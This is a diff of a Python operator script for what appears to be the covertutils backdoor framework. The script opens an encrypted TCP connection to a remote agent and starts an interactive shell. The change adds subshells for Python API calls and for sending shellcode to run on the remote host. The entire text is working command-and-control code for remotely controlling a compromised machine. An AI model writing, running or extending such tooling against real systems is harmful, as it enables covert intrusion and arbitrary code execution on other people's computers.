@@ -1,7 +1,9 @@
 #!/usr/bin/env python
 from covertutils.handlers import BaseHandler
 from covertutils.orchestration import SimpleOrchestrator
-from covertutils.shells import PrintShell
+
+from covertutils.shells.baseshell import BaseShell
+from covertutils.shells.subshells import SimpleSubShell, ShellcodeSubShell, PythonAPISubShell
 
 import sys
 import socket
@@ -16,12 +18,12 @@ except :
 	%s <ip> <port> <passphrase>""" % sys.argv[0]
 	sys.exit(1)
 
-addr = ip, int(port)
+client_addr = ip, int(port)
 
 orch = SimpleOrchestrator( passphrase, tag_length = 2, out_length = 50, in_length = 50, cycling_algorithm = sha512 )
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect( addr )
+s.connect( client_addr )
 
 def recv () :
 	return s.recv(50)
@@ -44,5 +46,5 @@ class MyHandler( BaseHandler ) :
 
 handler = MyHandler( recv, send, orch )
 
-shell = PrintShell(handler, prompt = "(%s:%d) [stream:{0}]$ " % addr)
+shell = BaseShell(handler, subshells = {'control' : SimpleSubShell, 'python' : PythonAPISubShell, 'main' : (SimpleSubShell, {'prompt_templ':'(%s:%d)[{stream}]> ' % client_addr} ), 'shellcode' : ShellcodeSubShell }, prompt = "(%s:%d)> " % client_addr )
 shell.start()
